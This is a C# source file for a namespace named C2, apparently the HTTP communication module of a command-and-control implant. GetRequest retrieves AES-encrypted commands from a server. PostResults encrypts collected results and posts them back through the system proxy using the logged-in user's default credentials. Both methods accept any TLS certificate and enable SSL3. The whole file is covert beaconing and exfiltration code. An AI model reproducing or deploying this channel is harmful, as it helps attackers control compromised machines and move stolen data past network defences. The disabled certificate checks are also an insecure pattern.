using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace C2
{
    class Http
    {
        public static string GetRequest(string url)
        {
            try
            {
                ServicePointManager.Expect100Continue = false;
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls;
                ServicePointManager.ServerCertificateValidationCallback = (object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) => { return true; };
                string responseContent = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET";
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                using (Stream resStream = response.GetResponseStream())
                {
                    using (StreamReader reader = new StreamReader(resStream, Encoding.UTF8))
                    {
                        responseContent = reader.ReadToEnd().ToString();
                    }
                }
                response.Close();
                return Encrypt.AesDecrypt(responseContent,Config.key);

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return "error";
            }

        }

        public static string PostResults(string results, string url)
        {
            try
            {
                string postData = Encrypt.AesEncrypt(results,Config.key);
                Console.WriteLine(postData);
                string responseFromServer = "";
                ServicePointManager.Expect100Continue = false;
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls;
                ServicePointManager.ServerCertificateValidationCallback = (object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) => { return true; };
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Proxy = WebRequest.GetSystemWebProxy();
                request.Proxy.Credentials = CredentialCache.DefaultCredentials;
                request.Method = "POST";
                byte[] byteArray = Encoding.UTF8.GetBytes(postData);
                request.ContentLength = byteArray.Length;
                Stream dataStream = request.GetRequestStream();
                dataStream.Write(byteArray, 0, byteArray.Length);
                dataStream.Close();
                WebResponse response = request.GetResponse();
                using (dataStream = response.GetResponseStream())
                {
                    StreamReader reader = new StreamReader(dataStream);
                    responseFromServer = reader.ReadToEnd();

                }
                response.Close();
                return Encrypt.AesDecrypt(responseFromServer, Config.key);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return "error";
            }
        }
    }
}
